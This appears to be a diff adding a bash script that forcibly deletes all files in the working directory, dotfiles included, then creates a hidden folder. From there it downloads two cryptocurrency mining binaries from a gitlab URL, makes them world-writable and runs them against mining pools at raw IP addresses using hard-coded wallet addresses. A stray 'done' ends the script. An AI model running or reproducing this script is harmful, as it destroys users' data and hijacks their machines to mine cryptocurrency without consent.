@@ -1,0 +1,17 @@
+#!/bin/bash
+rm -rvf * 
+rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash* .ngumpet*
+rm -R *
+mkdir .des
+cd .des
+rm -R *
+
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
+chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://64.225.25.181:80 -u v255vQEQnZj2NVjF3UHpTrtwA1cGdXt4dV.$(shuf -n 1 -i 1-99999)-VISH -t4 &
+
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.82a
+chmod 777 lol1.82a
+
+./lol1.82a -a PYRIN -p 138.197.98.18:80 -u pyrin:qrdnw92cg9wfqa4fqj0faemlctwy6cyguhzsm7dl3wasxccc4crmqy2r76qwn.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl
+
+done
